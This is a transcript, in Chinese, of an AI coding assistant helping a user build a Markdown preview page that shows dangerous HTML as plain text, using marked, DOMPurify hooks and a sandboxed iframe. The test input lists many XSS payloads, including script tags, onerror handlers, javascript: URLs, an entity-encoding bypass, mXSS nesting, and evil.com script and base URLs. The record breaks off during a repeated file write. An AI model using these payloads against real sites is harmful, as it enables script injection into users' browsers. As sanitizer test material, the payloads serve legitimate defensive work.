你不需要做任何特殊处理，**流程本身就天然支持这个需求**：

```
Markdown 输入                    marked.parse() 输出                     DOMPurify 处理

───── 代码块内 ─────
```                              <pre><code>                              不受影响（已是文本实体）
<script>alert(1)</script>   →   &lt;script&gt;alert(1)&lt;/script&gt;  →  &lt;script&gt;alert(1)&lt;/script&gt;
```                              </code></pre>                            浏览器显示为: <script>alert(1)</script> ✅

───── 代码块外 ─────
<script>alert(1)</script>   →   <script>alert(1)</script>            →  （被删除） ✅
<img src=x onerror=alert(1)> → <img src=x onerror=alert(1)>         →  <img src="x"> ✅
```

**关键点**：Markdown 解析器处理代码块时，会将 `<` 转义为 `&lt;`、`>` 转义为 `&gt;`。转义后的内容对 DOMPurify 来说就是普通文本，不会被识别为 HTML 标签，因此不会被删除。

### 唯一需要注意的坑

| 配置 | 正确做法 | 错误做法 |
|------|---------|---------|
| marked 的 `html` 选项 | 默认 `true` 即可，交给 DOMPurify 处理 | 不影响代码块 |
| DOMPurify 的 `ALLOWED_TAGS` | 必须包含 `pre` 和 `code` | 如果漏了，代码块容器标签会被删掉 |
| 不要对 marked 输出做二次 HTML 解码 | 直接传给 DOMPurify | 如果你手动把 `&lt;` 解码回 `<`，代码块内容就会变成真实标签被执行/删除 |

一句话总结：**保证 `marked → DOMPurify` 直连，不要在中间对 HTML 做任何解码操作，代码块中的 XSS 脚本就能安全地原样显示。**

已进行更改。

User: 但是我想要的是在预览页面可以完整的预览用户在markdown文件中写的内容，即使是一些恶意脚本，我也想要在预览markdown时也可以正常预览，有什么解决方法吗？

GitHub Copilot: 

## 核心矛盾

你想要：
1. **所有内容可见**——包括 `<script>`、`onerror` 等恶意代码
2. **不被执行**——看到但不触发

有三种方案，适用场景不同：

---

### 方案对比

| 方案 | 效果 | 适用场景 |
|------|------|---------|
| **Sandboxed iframe** | HTML 照常渲染，脚本不执行，配合 CSS 让 `<script>` 内容可见 | 最推荐，兼顾安全和预览完整性 |
| **markdown-it html:false** | 所有 HTML 标签转为纯文本展示 | 只需要看到源码文本 |
| **DOMPurify 最小净化** | 保留大部分 HTML 结构，只删最危险的 | 折中方案 | 

创建文件

User: @agent 重试

GitHub Copilot: 

## 你想要的效果

用户写了什么 Markdown，预览就**完整展示**什么，包括代码块外的裸 HTML/恶意脚本——但这些脚本**只是显示出来，不会被执行**。

这和"净化删除"是不同的策略：

| 策略 | 行为 | 效果 |
|------|------|------|
| DOMPurify 净化 | 删除 `<script>`、移除 `onerror` | 用户写的内容**消失了** |
| **你想要的** | 保留所有内容，但全部**转为纯文本展示** | 用户写的内容**完整可见，但不执行** |

---

### 解决方案

有两种思路：

---

### 方案 1：沙箱 iframe（推荐）

用 `sandbox` 属性的 iframe 加载预览内容。`sandbox` 会禁止所有脚本执行、表单提交、弹窗等，但 HTML/CSS 正常渲染。

**用户写的 `<script>alert(1)</script>` 会被浏览器当作 HTML 标签渲染（但不执行），页面上不可见（因为 `<script>` 标签默认 `display:none`）。所以需要结合 CSS 强制显示。**

更合理的做法是：将 Markdown 渲染后的 HTML 中，**非代码块部分的 HTML 标签转为可见文本**。

---

### 方案 2：非代码块的 HTML 标签也做转义展示（真正推荐）

Markdown 解析器只转义代码块内的 `<>`。我们需要额外处理：**让代码块外的原始 HTML 也以文本形式展示，而非被浏览器解析**。 

读取 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case8-codeblock-safe-preview.html#1-1)，行 1 到 10

已创建 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case9-full-preview.html)

直接浏览器打开 case9-full-preview.html，可以切换三种方案对比效果。

---

### 三种方案总结

| | 方案A: `sandbox` iframe | 方案B: `sandbox` + CSS | 方案C: HTML 转义展示 |
|---|---|---|---|
| **原理** | iframe 的 `sandbox` 属性禁止脚本执行 | 同A + CSS 强制 `display:block` 让 `<script>` 等标签可见 | 在 Markdown 解析前，把代码块外的 `<>` 转义为 `&lt;&gt;` |
| `<script>alert(1)</script>` | 不执行，但**文字不可见**（script 默认隐藏） | 不执行，文字**可见**，带橙色边框标记 | 不执行，直接**显示为文本** `<script>alert(1)</script>` |
| `<img src=x onerror=...>` | 不执行 onerror，显示破损图片 | 同左 | 显示为文本 `<img src=x onerror=...>` |
| `<style>body{background:red}</style>` | **CSS 会生效**（iframe 内背景变红） | CSS 被显示为文本 | 显示为文本 |
| 正常 Markdown | 正常渲染 | 正常渲染 | 正常渲染 |
| **安全级别** | 高（sandbox 隔离） | 高 | 最高（不存在任何 HTML 解析） |
| **推荐场景** | 想保留 HTML 渲染效果 | 想看到所有标签内容 | 纯文本展示，最安全 |

**推荐**：
- 如果你想**保留用户 HTML 的渲染效果**（比如用户写了 `<div style="color:red">` 想看到红色文字）→ **方案 B**
- 如果你只想**完整看到用户写了什么**，不需要渲染 HTML → **方案 C**

已进行更改。

User: 如果按照方案3，纯文本展示的话，那这个 <img src="https://qiniucloud..space/images202501270030826.jpg" alt="16819581115172"
     style="zoom:50%;" /> 图片预览是不是就不行了？

GitHub Copilot: 

对，**方案 C 会把所有 HTML 标签都转为纯文本**，包括正常的 `<img>` 图片标签，图片就无法渲染了。

你真正需要的是一个**混合方案**：

| 内容类型 | 期望行为 |
|---------|---------|
| `<img src="真实图片.jpg">` | 正常渲染为图片 |
| `<img src=x onerror=alert(1)>` | 渲染图片（破损），`onerror` 被移除并**显示出来** |
| `<script>alert(1)</script>` | 不执行，**以文本形式展示**完整内容 |
| `<a href="javascript:...">` | 链接可见，`javascript:` 协议被移除并**标注** |

我来加一个方案 D： 

读取 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case9-full-preview.html#1-1)，行 1 到 50

读取 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case9-full-preview.html#50-50)，行 50 到 120

读取 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case9-full-preview.html#120-120)，行 120 到 200

读取 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case9-full-preview.html#200-200)，行 200 到 337

现在我来添加**方案 D（混合方案）**：安全标签正常渲染（图片可见），危险标签/属性转为可见文本标注。 

正在将 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case9-full-preview.html) 中的 33 行替换为 205 行


```

```
刷新浏览器打开 case9-full-preview.html，切换到 **方案D: 混合（推荐）** 标签页查看效果。

---

### 方案D 的处理逻辑

```
Markdown → marked.parse() → DOMParser 解析为 DOM 树 → 遍历处理 → sandbox iframe 渲染
```

对每个 DOM 节点分三种情况：

| 遇到什么 | 如何处理 | 预览效果 |
|---------|---------|---------|
| `<img src="真实图片.jpg" style="zoom:50%">` | **保留不动** | 正常显示图片 |
| `<img src=x onerror=alert(1)>` | 移除 `onerror`，保留 `<img>`，旁边标注 `[已拦截: onerror="alert(1)"]` | 显示破损图片 + 橙色标注 |
| `<script>alert(1)</script>` | 整个替换为红色文本块，显示完整内容 | 红色边框内显示 `<script> alert(1)` |
| `<a href="javascript:...">` | 移除 href，链接文字加删除线，标注原 href | 删除线文字 + 橙色标注 |
| `<style>body{background:red}</style>` | 整个替换为红色文本块 | 不会影响页面样式，内容可见 |
| `<div onmouseover=alert(1)>文字</div>` | 移除 `onmouseover`，保留 `<div>文字</div>` | 正常显示文字 + 橙色标注 |

这样你的那张 `<img src="https://qiniucloud..space/..." style="zoom:50%">` **会正常渲染为图片**，而恶意脚本全部以可见文本标注出来。

已进行更改。

User: 可是这样还是会在预览页面破坏用户自己书写的markdown文本内容，我想要的是把用户书写的markdown内容全部正常渲染出来，如果有恶意代码的话，就按照纯文本展示，其他的正常展示，这种方案可行吗？或者你可以给我更多的方案

GitHub Copilot: 

完全可行。核心思路是：**在 Markdown 渲染时，对原始 HTML 做安全判断——安全的正常渲染，危险的转为纯文本显示**。 

已创建 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case10-hybrid-preview.html)

直接浏览器打开 case10-hybrid-preview.html 查看效果。

---

### 方案原理

利用 `marked` 的**自定义 renderer** —— marked 解析 Markdown 时，会把用户写的原始 HTML 识别为 `html` 类型的 token，我们只需要重写这一个处理函数：

```javascript
const renderer = {
  html(token) {
    if (isDangerous(token.raw)) {
      // 危险 → 转义为纯文本展示
      return `<code class="xss-text">${escapeHtml(token.raw)}</code>`;
    }
    // 安全 → 原样渲染
    return token.raw;
  },
};
```

### 各类内容的处理结果

| 用户写的内容 | 预览效果 |
|---|---|
| `# 标题` / `**加粗**` / `- 列表` | 正常渲染（不走 html renderer） |
| `![图片](url)` / `[链接](url)` | 正常渲染（Markdown 语法） |
| `<img src="真实图片.jpg" style="zoom:50%">` | **正常渲染为图片**（安全 HTML） |
| `<div style="color:red">文字</div>` | **正常渲染为红色文字**（安全 HTML） |
| `<br>` / `<hr>` | 正常渲染 |
| `<script>alert(1)</script>` | 显示为黄底橙色纯文本：`<script>alert(1)</script>` |
| `<img src=x onerror=alert(1)>` | 显示为纯文本（因为有 `onerror`） |
| `<a href="javascript:...">click</a>` | 显示为纯文本 |
| `<iframe src="...">` | 显示为纯文本 |
| `<style>body{background:red}</style>` | 显示为纯文本（不影响页面样式） |
| 代码块里的任何内容 | 正常显示为代码（不受影响） |

**关键区别**：同一个 `<img>` 标签，有 `onerror` 的转纯文本，没有的正常渲染为图片。用户内容不会被删除或破坏，只是危险部分换了个展示方式。

已进行更改。

User: 除了这些方案外，你有没有更好的方案？

GitHub Copilot: 

有。目前的方案都有一个根本问题：**用正则匹配 HTML 字符串来判断危险性，容易被各种编码/换行/大小写绕过**。

下面给你两个本质上更好的方案：

---

### 更好的方案思路

| 方案 | 原理 | 优势 |
|------|------|------|
| **方案 E: DOMPurify 转存而非删除** | DOMPurify 本身已经能精确识别危险元素，利用它的 hook 在净化时把危险节点**转为文本**而非删除 | 复用 DOMPurify 的全部安全能力（mXSS 防御、编码处理），不需要自己写检测规则 |
| **方案 F: rehype AST 树变换** | 在 Markdown→HTML 管道中间，用 unified/rehype 在**语法树层面**精确识别和转换危险节点 | AST 级别操作，无正则绕过风险，最精确 |

**方案 E** 最实用。 

已创建 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case11-dompurify-to-text.html)

浏览器打开 case11-dompurify-to-text.html 查看效果。

---

### 方案 E 为什么比之前的方案更好

之前所有方案的根本问题：**自己写正则来判断 HTML 是否危险**。这一定会有遗漏：

```
你的正则检测不到               DOMPurify 能处理
─────────────────────────     ────────────────────
<a href="&#106;avascript:">    ✅ HTML 实体绕过
<a href="java\nscript:">      ✅ 换行绕过
<math><mtext>...<img onerror>  ✅ mXSS 命名空间混淆
<scr\x00ipt>                   ✅ 空字节绕过
```

**方案 E 的核心区别**：不自己判断什么是危险的，而是**让 DOMPurify 来判断，但改变它的处理方式**：

```
传统 DOMPurify:    危险节点 → 删除
方案 E:           危险节点 → 转为可见纯文本
```

处理流程：

```
Markdown 输入
    │
    ▼
marked.parse()         → 原始 HTML
    │
    ▼
DOMPurify.sanitize()   → 遇到危险标签 → hook 拦截 → 替换为 <code>纯文本</code>
    │                  → 遇到危险属性 → hook 拦截 → 移除属性 + 添加 [已拦截] 标注
    │                  → 安全内容     → 原样保留
    ▼
sandbox iframe         → 安全渲染
```

| 内容 | 方案 E 效果 |
|------|------------|
| `<img src="真实图片.jpg" style="zoom:50%">` | **正常渲染图片** |
| `<div style="color:red">文字</div>` | **正常渲染红色文字** |
| `<script>alert(1)</script>` | 显示黄底纯文本 `<script>alert(1)</script>` |
| `<img src="图片.jpg" onerror=alert(1)>` | **图片正常渲染** + 旁边标注 `[已拦截: onerror="alert(1)"]` |
| `<a href="javascript:...">链接</a>` | 链接文字显示（灰色删除线）+ 标注 `[已拦截: href="javascript:..."]` |
| HTML 实体编码的 javascript: | DOMPurify **自动识别并拦截**（不需要我们写正则） |
| mXSS 变异攻击 | DOMPurify **自动防御**（用浏览器原生 DOM 解析器） |

**一句话总结**：不要重复造轮子检测 XSS，让 DOMPurify 检测，我们只改变它"删除"这个行为变成"转文本展示"。

已进行更改。

User: 修复这个问题

GitHub Copilot: 

文件被格式化工具严重破坏了（JS 代码缩进、模板字符串、正则都被打乱）。我需要重写整个文件。 

Ran terminal command:  cat /dev/null > "/未命名文件夹/case11-dompurify-to-text.html"

正在将 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case11-dompurify-to-text.html) 中的 1 行替换为 367 行


```

```
已修复。主要改动：

1. **模板字符串 → 字符串拼接**：格式化工具会破坏 JS 模板字符串（反引号 `` ` `` 内的 `${}`），改用 `+` 拼接和 `wrapInDoc()` 函数，彻底避免这个问题
2. **箭头函数 → function 关键字**：防止格式化工具拆行
3. **CSS 样式用数组 join**：避免多行模板字符串被破坏
4. **textarea 中的 HTML 实体**：用 `&lt;` `&gt;` 代替裸 `<` `>`，防止浏览器在解析 textarea 时提前解释 HTML 标签

刷新浏览器打开 case11-dompurify-to-text.html 即可正常使用。

已进行更改。

User: 如果遇到危险标签和危险内容的话，不需要显示黄底或者灰色删除线或者添加标注，直接展示为纯文本可以吗？

GitHub Copilot: 

 

读取 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case11-dompurify-to-text.html#1-1)，行 1 到 30

文件又被格式化了。我直接重写一个简洁版，危险内容只转纯文本，不加任何样式标注。 

Ran terminal command:  cat /dev/null > "/未命名文件夹/case11-dompurify-to-text.html"

Ran terminal command:  cat > "/未命名文件夹/case11-dompurify-to-text.html" << 'HTMLEOF'
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>DOMPurify 危险内容转纯文本预览</title>
<style>
*{box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;margin:0;padding:20px;background:#f5f5f5}h1{font-size:18px;margin-top:0}.container{display:flex;gap:16px}.panel{flex:1;min-width:0}textarea{width:100%;height:650px;font-family:Menlo,Consolas,monospace;font-size:13px;padding:12px;border:1px solid #ccc;border-radius:4px;resize:vertical}.preview-frame{border:1px solid #ccc;border-radius:4px;background:#fff;width:100%;height:650px}.section-title{font-weight:bold;margin-bottom:8px}
</style>
</head>
<body>
<h1>DOMPurify 危险内容转纯文本 —— 安全 HTML 正常渲染</h1>
<div class="container">
<div class="panel">
<div class="section-title">Markdown 输入</div>
<textarea id="editor"># 正常 Markdown 内容

- **加粗** 和 *斜体* 和 ~~删除线~~
- `行内代码`

[正常链接](https://example.com)

![Markdown图片](https://qiniucloud..space/images202501270030826.jpg)

> 这是一段引用文字

| 表头1 | 表头2 |
|-------|-------|
| 数据1 | 数据2 |

```javascript
function hello() {
  console.log("Hello World");
}
```

---

# 安全 HTML（正常渲染）

<img src="https://qiniucloud..space/images202501270030826.jpg" alt="正常图片" style="zoom:50%;" />

<div style="color: blue; font-size: 18px; border: 1px solid blue; padding: 8px;">
  蓝色 div 正常渲染
</div>

这段有<span style="color:red; font-weight:bold;">红色加粗</span>的内容

第一行<br>第二行<br>第三行

---

# 危险 HTML（转为纯文本展示）

<script>alert('XSS')</script>

<script src="https://evil.com/malware.js"></script>

<img src=x onerror="alert('XSS')">

<img src="https://qiniucloud..space/images202501270030826.jpg" onerror="alert('XSS')" onload="alert('loaded')">

<div onmouseover=alert('XSS')>鼠标移入触发</div>

<input onfocus="alert('XSS')" autofocus>

<details open ontoggle="alert('XSS')">展开触发</details>

<a href="javascript:alert('XSS')">恶意链接</a>

<a href="JaVaScRiPt:alert('XSS')">大小写绕过</a>

<svg onload="alert('XSS')">

<svg><script>alert('XSS')</script></svg>

<iframe src="javascript:alert('XSS')"></iframe>

<iframe src="https://evil.com"></iframe>

<object data="javascript:alert('XSS')"></object>

<embed src="javascript:alert('XSS')">

<style>body{background:red !important}</style>

<form action="javascript:alert('XSS')"><input type="submit"></form>

<base href="https://evil.com">

<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">

<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS')">HTML实体绕过</a>

<math><mtext><table><mglyph><style><!--</style><img src=x onerror="alert(1)">

---

# 混合场景

正常文字 <script>alert('行内XSS')</script> 后续正常文字

**加粗** 中间 <img src=x onerror="alert(1)"> 继续 *斜体*

安全图片和危险图片对比：
<img src="https://qiniucloud..space/images202501270030826.jpg" style="width:100px" />
<img src="https://qiniucloud..space/images202501270030826.jpg" onclick="alert(1)" /></textarea>
</div>
<div class="panel">
<div class="section-title">安全预览</div>
<iframe id="preview" class="preview-frame" sandbox="allow-same-origin"></iframe>
</div>
</div>
<script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/dompurify/dist/purify.min.js"></script>
<script>
var PREVIEW_CSS = 'body{font-family:-apple-system,sans-serif;padding:16px;margin:0;line-height:1.6;color:#333}pre{background:#1e1e1e;color:#d4d4d4;padding:16px;border-radius:4px;overflow-x:auto}code{font-family:Menlo,Consolas,monospace;font-size:13px}p>code,li>code{background:#f0f0f0;padding:2px 6px;border-radius:3px}blockquote{border-left:4px solid #ddd;margin:0;padding:8px 16px;color:#666}table{border-collapse:collapse}th,td{border:1px solid #ddd;padding:8px;text-align:left}img{max-width:100%}hr{border:none;border-top:1px solid #ddd;margin:24px 0}';

function reconstructHTML(el) {
  var tag = el.tagName.toLowerCase();
  var a = '';
  for (var i = 0; i < el.attributes.length; i++) {
    a += ' ' + el.attributes[i].name + '="' + el.attributes[i].value + '"';
  }
  var inner = el.innerHTML || el.textContent || '';
  return inner ? '<' + tag + a + '>' + inner + '</' + tag + '>' : '<' + tag + a + '>';
}

function renderSafe(markdown) {
  var rawHtml = marked.parse(markdown);
  DOMPurify.removeAllHooks();

  var blocked = ['script','style','iframe','object','embed','applet','form','base','meta','link','noscript','noembed','frameset','frame','title','xmp','plaintext','isindex','bgsound','layer','svg','math'];

  // 危险标签 → 纯文本节点（无任何样式）
  DOMPurify.addHook('uponSanitizeElement', function(node, data) {
    if (node.nodeType !== 1) return;
    var tag = (data.tagName || '').toLowerCase();
    if (blocked.indexOf(tag) !== -1) {
      var text = document.createTextNode(reconstructHTML(node));
      node.replaceWith(text);
    }
  });

  // 有危险属性的标签 → 整个标签转为纯文本
  DOMPurify.addHook('uponSanitizeAttribute', function(node, data) {
    if (!data.attrName) return;
    if (/^on/i.test(data.attrName)) {
      node._xssDanger = true;
    }
    if (data.attrName === 'href' || data.attrName === 'src' || data.attrName === 'action') {
      var v = (data.attrValue || '').replace(/[\s\x00-\x1f]/g, '');
      if (/^(javascript|vbscript|data\s*:)/i.test(v)) {
        node._xssDanger = true;
      }
    }
  });

  DOMPurify.addHook('afterSanitizeAttributes', function(node) {
    if (node._xssDanger) {
      // 重建原始标签文本，替换为纯文本节点
      var original = '<' + node.tagName.toLowerCase();
      // 注意：危险属性已被 DOMPurify 移除，需要在 uponSanitizeAttribute 时记录
      // 这里用简化方式：显示 DOMPurify 处理后的标签（危险属性已移除的版本不完整）
      // 所以我们在 uponSanitizeAttribute 时就记录完整属性
      if (node._xssOrigAttrs) {
        original += node._xssOrigAttrs;
      }
      var inner = node.innerHTML || '';
      original += '>' + inner + '</' + node.tagName.toLowerCase() + '>';
      var text = document.createTextNode(original);
      node.replaceWith(text);
      return;
    }
  });

  // 额外 hook：在属性净化前先记录完整的原始属性字符串
  DOMPurify.addHook('uponSanitizeAttribute', function(node, data) {
    if (!node._xssOrigRecorded && node.nodeType === 1) {
      var a = '';
      for (var i = 0; i < node.attributes.length; i++) {
        a += ' ' + node.attributes[i].name + '="' + node.attributes[i].value + '"';
      }
      node._xssOrigAttrs = a;
      node._xssOrigRecorded = true;
    }
  });

  var cleanDom = DOMPurify.sanitize(rawHtml, {
    RETURN_DOM: true,
    ADD_TAGS: ['details', 'summary'],
    ADD_ATTR: ['open', 'style']
  });

  var result = cleanDom.innerHTML;
  DOMPurify.removeAllHooks();
  return result;
}

function render() {
  var md = document.getElementById('editor').value;
  var html = renderSafe(md);
  document.getElementById('preview').srcdoc = '<!DOCTYPE html><html><head><meta charset="UTF-8"><style>' + PREVIEW_CSS + '</style></head><body>' + html + '</body></html>';
}

document.getElementById('editor').addEventListener('input', render);
render();
</script>
</body>
</html>
HTMLEOF

读取 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case11-dompurify-to-text.html)

heredoc 没写入成功，换种方式。 

Ran terminal command:  cd "/未命名文件夹" && node -e "
var fs = require('fs');
var content = fs.readFileSync('/dev/stdin', 'utf8');
fs.writeFileSync('case11-dompurify-to-text.html', content);
console.log('written', content.length, 'bytes');
" << 'NODEEOF'
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>DOMPurify 危险内容转纯文本预览</title>
<style>*{box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;margin:0;padding:20px;background:#f5f5f5}h1{font-size:18px;margin-top:0}.container{display:flex;gap:16px}.panel{flex:1;min-width:0}textarea{width:100%;height:650px;font-family:Menlo,Consolas,monospace;font-size:13px;padding:12px;border:1px solid #ccc;border-radius:4px;resize:vertical}.preview-frame{border:1px solid #ccc;border-radius:4px;background:#fff;width:100%;height:650px}.section-title{font-weight:bold;margin-bottom:8px}</style>
</head>
<body>
<h1>DOMPurify 危险内容转纯文本 - 安全HTML正常渲染</h1>
<div class="container">
<div class="panel">
<div class="section-title">Markdown 输入</div>
<textarea id="editor"># 正常 Markdown 内容

- **加粗** 和 *斜体* 和 ~~删除线~~
- \`行内代码\`

[正常链接](https://example.com)

![Markdown图片](https://qiniucloud..space/images202501270030826.jpg)

> 这是一段引用文字

| 表头1 | 表头2 |
|-------|-------|
| 数据1 | 数据2 |

\`\`\`javascript
function hello() {
  console.log("Hello World");
}
\`\`\`

---

# 安全 HTML（正常渲染）

<img src="https://qiniucloud..space/images202501270030826.jpg" alt="正常图片" style="zoom:50%;" />

<div style="color: blue; font-size: 18px; border: 1px solid blue; padding: 8px;">
  蓝色 div 正常渲染
</div>

这段有<span style="color:red; font-weight:bold;">红色加粗</span>的内容

第一行<br>第二行<br>第三行

---

# 危险 HTML（转为纯文本展示）

<script>alert('XSS')</script>

<script src="https://evil.com/malware.js"></script>

<img src=x onerror="alert('XSS')">

<img src="https://qiniucloud..space/images202501270030826.jpg" onerror="alert('XSS')" onload="alert('loaded')">

<div onmouseover=alert('XSS')>鼠标移入触发</div>

<input onfocus="alert('XSS')" autofocus>

<a href="javascript:alert('XSS')">恶意链接</a>

<svg onload="alert('XSS')">

<iframe src="javascript:alert('XSS')"></iframe>

<iframe src="https://evil.com"></iframe>

<style>body{background:red !important}</style>

<form action="javascript:alert('XSS')"><input type="submit"></form>

<base href="https://evil.com">

<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">

<a href="&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;alert('XSS')">HTML实体绕过</a>

---

# 混合场景

正常文字 <script>alert('行内XSS')</script> 后续正常文字

**加粗** 中间 <img src=x onerror="alert(1)"> 继续 *斜体*

安全图片和危险图片对比：
<img src="https://qiniucloud..space/images202501270030826.jpg" style="width:100px" />
<img src="https://qiniucloud..space/images202501270030826.jpg" onclick="alert(1)" /></textarea>
</div>
<div class="panel">
<div class="section-title">安全预览</div>
<iframe id="preview" class="preview-frame" sandbox="allow-same-origin"></iframe>
</div>
</div>
<script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/dompurify/dist/purify.min.js"></script>
<script>
var CSS='body{font-family:-apple-system,sans-serif;padding:16px;margin:0;line-height:1.6;color:#333}pre{background:#1e1e1e;color:#d4d4d4;padding:16px;border-radius:4px;overflow-x:auto}code{font-family:Menlo,Consolas,monospace;font-size:13px}p>code,li>code{background:#f0f0f0;padding:2px 6px;border-radius:3px}blockquote{border-left:4px solid #ddd;margin:0;padding:8px 16px;color:#666}table{border-collapse:collapse}th,td{border:1px solid #ddd;padding:8px;text-align:left}img{max-width:100%}hr{border:none;border-top:1px solid #ddd;margin:24px 0}';
function rebuildTag(el){var t=el.tagName.toLowerCase(),a='';for(var i=0;i<el.attributes.length;i++){a+=' '+el.attributes[i].name+'="'+el.attributes[i].value+'"'}var inner=el.innerHTML||el.textContent||'';return inner?'<'+t+a+'>'+inner+'</'+t+'>':'<'+t+a+'>'}
function renderSafe(md){var raw=marked.parse(md);DOMPurify.removeAllHooks();var blocked=['script','style','iframe','object','embed','applet','form','base','meta','link','noscript','noembed','frameset','frame','title','xmp','plaintext','isindex','bgsound','layer','svg','math'];DOMPurify.addHook('uponSanitizeElement',function(n,d){if(n.nodeType!==1)return;var tag=(d.tagName||'').toLowerCase();if(blocked.indexOf(tag)!==-1){n.replaceWith(document.createTextNode(rebuildTag(n)))}});DOMPurify.addHook('uponSanitizeAttribute',function(n,d){if(!d.attrName)return;if(!n._xOrig){var a='';for(var i=0;i<n.attributes.length;i++){a+=' '+n.attributes[i].name+'="'+n.attributes[i].value+'"'}n._xOrig=a;n._xTag=n.tagName.toLowerCase();n._xInner=n.innerHTML||''}if(/^on/i.test(d.attrName)){n._xDanger=true}if((d.attrName==='href'||d.attrName==='src'||d.attrName==='action')&&/^(javascript|vbscript|data\s*:)/i.test((d.attrValue||'').replace(/[\s\x00-\x1f]/g,''))){n._xDanger=true}});DOMPurify.addHook('afterSanitizeAttributes',function(n){if(n._xDanger){var txt='<'+n._xTag+n._xOrig+'>'+n._xInner+'</'+n._xTag+'>';n.replaceWith(document.createTextNode(txt))}});var dom=DOMPurify.sanitize(raw,{RETURN_DOM:true,ADD_TAGS:['details','summary'],ADD_ATTR:['open','style']});var r=dom.innerHTML;DOMPurify.removeAllHooks();return r}
function render(){var md=document.getElementById('editor').value;var h=renderSafe(md);document.getElementById('preview').srcdoc='<!DOCTYPE html><html><head><meta charset="UTF-8"><style>'+CSS+'</style></head><body>'+h+'</body></html>'}
document.getElementById('editor').addEventListener('input',render);render();
</script>
</body>
</html>
NODEEOF
Completed with input:  cd "/未命名文件夹" && node -e "
var fs = require('fs');
var content = fs.readFileSync('/dev/stdin', 'utf8');
fs.writeFileSync('case11-dompurify-to-text.html', content);
console.log('written', content.length, 'bytes');
" << 'NODEEOF'
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>DOMPurify 危险内容转纯文本预览</title>
<style>*{box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;margin:0;padding:20px;background:#f5f5f5}h1{font-size:18px;margin-top:0}.container{display:flex;gap:16px}.panel{flex:1;min-width:0}textarea{width:100%;height:650px;font-family:Menlo,Consolas,monospace;font-size:13px;padding:12px;border:1px solid #ccc;border-radius:4px;resize:vertical}.preview-frame{border:1px solid #ccc;border-radius:4px;background:#fff;width:100%;height:650px}.section-title{font-weight:bold;margin-bottom:8px}</style>
</head>
<body>
<h1>DOMPurify 危险内容转纯文本 - 安全HTML正常渲染</h1>
<div class="container">
<div class="panel">
<div class="section-title">Markdown 输入</div>
<textarea id="editor"># 正常 Markdown 内容

- **加粗** 和 *斜体* 和 ~~删除线~~
- \`行内代码\`

[正常链接](https://example.com)

![Markdown图片](https://qiniucloud..space/images202501270030826.jpg)

> 这是一段引用文字

| 表头1 | 表头2 |
|-------|-------|
| 数据1 | 数据2 |

\`\`\`javascript
function hello() {
  console.log("Hello World");
}
\`\`\`

---

# 安全 HTML（正常渲染）

<img src="https://qiniucloud..space/images202501270030826.jpg" alt="正常图片" style="zoom:50%;" />

<div style="color: blue; font-size: 18px; border: 1px solid blue; padding: 8px;">
  蓝色 div 正常渲染
</div>

这段有<span style="color:red; font-weight:bold;">红色加粗</span>的内容

第一行<br>第二行<br>第三行

---

# 危险 HTML（转为纯文本展示）

<script>alert('XSS')</script>

<script src="https://evil.com/malware.js"></script>

<img src=x onerror="alert('XSS')">

<img src="https://qiniucloud..space/images202501270030826.jpg" onerror="alert('XSS')" onload="alert('loaded')">

<div onmouseover=alert('XSS')>鼠标移入触发</div>

<input onfocus="alert('XSS')" autofocus>

<a href="javascript:alert('XSS')">恶意链接</a>

<svg onload="alert('XSS')">

<iframe src="javascript:alert('XSS')"></iframe>

<iframe src="https://evil.com"></iframe>

<style>body{background:red !important}</style>

<form action="javascript:alert('XSS')"><input type="submit"></form>

<base href="https://evil.com">

<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">

<a href="&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;alert('XSS')">HTML实体绕过</a>

---

# 混合场景

正常文字 <script>alert('行内XSS')</script> 后续正常文字

**加粗** 中间 <img src=x onerror="alert(1)"> 继续 *斜体*

安全图片和危险图片对比：
<img src="https://qiniucloud..space/images202501270030826.jpg" style="width:100px" />
<img src="https://qiniucloud..space/images202501270030826.jpg" onclick="alert(1)" /></textarea>
</div>
<div class="panel">
<div class="section-title">安全预览</div>
<iframe id="preview" class="preview-frame" sandbox="allow-same-origin"></iframe>
</div>
</div>
<script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/dompurify/dist/purify.min.js"></script>
<script>
